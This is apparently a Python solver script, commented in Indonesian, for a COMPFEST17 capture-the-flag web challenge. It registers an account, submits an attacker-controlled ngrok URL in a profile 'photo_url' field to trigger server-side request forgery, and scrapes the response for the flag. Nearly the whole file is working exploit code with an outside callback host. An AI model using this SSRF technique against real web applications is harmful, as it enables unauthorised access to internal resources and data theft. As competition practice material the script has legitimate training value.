import requests
import re
from bs4 import BeautifulSoup
import os

# --- KONFIGURASI ---
TARGET_URL = "http://ctf.compfest.id:7302"

# Ganti dengan URL unik dari webhook.site yang sudah kamu konfigurasi
WEBHOOK_URL = "https://3e2f53135169.ngrok-free.app" 

# Detail akun (username acak untuk menghindari konflik)
USERNAME = f"heker"
PASSWORD = "heker"
# --------------------

def solve():
    if "YOUR_WEBHOOK_SITE_URL" in WEBHOOK_URL:
        print("❌ [Error] Harap ganti 'YOUR_WEBHOOK_SITE_URL' di dalam skrip dengan URL dari webhook.site!")
        return

    print("🚀 Memulai solver v3 (metode webhook.site)...")
    s = requests.Session()

    try:
        # 1. Registrasi & Login
        print(f"[*] Registrasi & Login sebagai '{USERNAME}'...")
        s.post(f"{TARGET_URL}/register", data={"username": USERNAME, "password": PASSWORD}, timeout=10)
        login_res = s.post(f"{TARGET_URL}/login", data={"username": USERNAME, "password": PASSWORD}, timeout=10)
        if "Invalid credentials" in login_res.text and "Welcome" not in login_res.text:
            raise Exception("Login gagal!")
        print("[+] Login berhasil.")

        # 2. Memicu SSRF menggunakan URL webhook
        profile_data = {"photo_url": WEBHOOK_URL}
        print(f"[*] Memicu SSRF dengan URL: {WEBHOOK_URL}")
        profile_res = s.post(f"{TARGET_URL}/profile", data=profile_data, timeout=15)
        
    except requests.exceptions.RequestException as e:
        print(f"\n❌ Error saat koneksi: {e}")
        return

    # 3. Cari flag di respons HTML
    print("[*] Mencari flag di dalam respons...")
    soup = BeautifulSoup(profile_res.text, 'html.parser')
    error_preview = soup.find('pre')
    
    if error_preview:
        content = error_preview.get_text()
        print("\n--- Konten Ditemukan ---")
        print(content.strip())
        print("-----------------------\n")
        
        flag_match = re.search(r'COMPFEST17{[^}]+}', content)
        if flag_match:
            print(f"✅ Flag Ditemukan: {flag_match.group(0)}")
        else:
            print("❌ Flag tidak ditemukan di dalam konten.")
    else:
        print("❌ Tidak dapat menemukan bagian 'error_preview'. Cek lagi konfigurasi webhook.site.")

if __name__ == "__main__":
    solve()